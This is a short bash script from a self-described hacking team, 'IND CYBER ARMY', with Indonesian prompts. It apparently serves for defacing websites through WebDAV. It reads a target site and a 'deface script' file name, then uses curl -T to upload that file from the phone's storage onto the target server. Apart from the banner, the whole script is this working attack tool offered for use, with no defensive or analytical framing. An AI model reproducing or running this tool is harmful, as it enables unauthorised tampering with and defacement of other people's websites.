#!/bin/bash
#webdav

clear
# Variables
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet Ind Cyber Army| lolcat

echo "=================================== $green"| lolcat 
echo "Autor : Dry_Ica_Tuan-Ar $green "| lolcat
echo "Pacar : Peri-Kecil $green "| lolcat
echo "Team  : IND CYBER ARMY $green "| lolcat 
echo "Teman : CYBER MUSLIM NKRI $green "| lolcat
echo "=================================== $green"| lolcat 

echo "╭─[Masukan Target]$green "| lolcat
read -p "   ╰─Nama Web=" target;
sleep 1
echo "╭─[Masukan Secrip Deface] $green"| lolcat
read -p "   ╰─Nama Secrip Deface=" file;
sleep 1
echo "Sek loading.... $green "| lolcat 
sleep 1
curl -T /storage/emulated/0/$file $target 